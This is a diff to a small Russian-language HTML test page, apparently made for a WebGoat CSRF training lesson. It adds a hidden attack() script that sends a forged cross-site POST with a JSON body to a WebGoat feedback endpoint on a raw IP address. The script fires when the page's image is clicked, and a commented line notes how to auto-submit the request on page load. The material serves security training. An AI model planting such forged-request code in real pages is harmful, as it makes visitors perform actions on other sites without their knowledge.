@@ -11,7 +11,7 @@
   <body>
     <!--Основное содержимое страницы-->
     <p>Тестовая страница</p>
-    <img id="my_image" src="/img/first.jpg"/>
+    <img id="my_image" src="/img/first.jpg"/ onclick="attack()">
     <p id="text">Собачка1</p>
     <input value="Нажми меня" onclick="changepic()" type="button"/>
     <div>
@@ -64,6 +64,17 @@
             e.preventDefault(); 
           });
         });
+  </script>
+  <script>       
+    function attack(){
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'http://18.214.61.110:8888/WebGoat/csrf/feedback/message', true);
+      xhr.send('{
+  "name"    : "WebGoat",
+  "email"   : "webgoat@webgoat.org",
+  "content" : "WebGoat is the best!!"
+}');
+    }
   </script>
   <!-- <script>document.getElementById('lesson2').submit(); </script>  onload=document.getElementById('cat').submit(); Для автоматизации submit-->
 </html>
